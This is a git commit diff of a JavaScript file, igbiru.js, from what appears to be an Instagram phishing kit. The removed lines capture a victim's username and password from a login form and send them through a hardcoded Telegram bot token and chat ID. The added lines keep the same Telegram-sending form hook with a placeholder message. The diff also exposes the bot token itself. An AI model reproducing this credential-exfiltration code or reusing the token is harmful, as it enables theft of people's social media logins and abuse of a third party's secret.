0d18a57d23f9ab2c6d3a7cf5c18d9e75eeeeb9fd
uciharidwan <161241056+uciharidwan@users.noreply.github.com>
2024-02-26 01:57:53 +0700

    Update igbiru.js

--- igbiru.js
+++ igbiru.js
@@ -1,38 +1,27 @@
-// igbiru.js
+    function kirimPesanTelegram(pesan) {
+        var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Ganti dengan token bot Anda
+        var chatId = '2079666452'; // Ganti dengan ID obrolan Anda
+        var message = encodeURIComponent(pesan);
+        var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;
 
-// Fungsi untuk mengirim pesan ke Telegram
-function kirimPesanTelegram(pesan) {
-    var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Token bot Anda
-    var chatId = '2079666452'; // ID obrolan Anda
-    var message = encodeURIComponent(pesan);
-    var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                // Handle response if needed
+                console.log(data);
+            })
+            .catch(error => {
+                // Handle error if needed
+                console.error('Error:', error);
+            });
+    }
 
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            // Handle response if needed
-            console.log(data);
-        })
-        .catch(error => {
-            // Handle error if needed
-            console.error('Error:', error);
-        });
-}
+    // Menangani pengiriman form
+    document.querySelector('.contacts__form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Menghentikan pengiriman form bawaan
 
-// Menangani pengiriman form
-document.querySelector('.contacts__form').addEventListener('submit', function(event) {
-    event.preventDefault(); // Menghentikan pengiriman form bawaan
+        var pesan = 'Pesan yang 66667777777 ingin Anda kirim'; // Sesuaikan pesan sesuai dengan data dari form
+        kirimPesanTelegram(pesan);
 
-    var pesan = `
-( Instagram | Login )
-==========================
-- Username : ${uname}
-- Password : ${pass} 
-==========================
-Tele : @RXLHOSTING
-`; // Pesan yang ingin Anda kirim
-
-    kirimPesanTelegram(pesan);
-
-    // Tambahkan logika lain yang Anda perlukan setelah pengiriman pesan
-});
+        // Tambahkan logika lain yang Anda perlukan setelah pengiriman pesan
+    });
